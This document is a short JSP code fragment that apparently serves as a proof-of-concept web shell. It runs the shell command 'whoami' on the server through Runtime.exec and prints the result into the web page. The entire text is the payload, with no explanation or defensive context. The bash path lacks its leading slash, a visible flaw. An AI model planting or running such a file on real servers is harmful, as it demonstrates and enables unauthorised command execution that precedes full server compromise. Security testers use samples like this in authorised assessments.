<%
    try {
        Process p = Runtime.getRuntime().exec("usr/bin/bash -c whoami");
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String l;
        while ((l = r.readLine()) != null) {
            out.println(l + "<br>");
        }
    } catch (Exception e) {
        out.println("ERROR: " + e.toString());
    }
%>
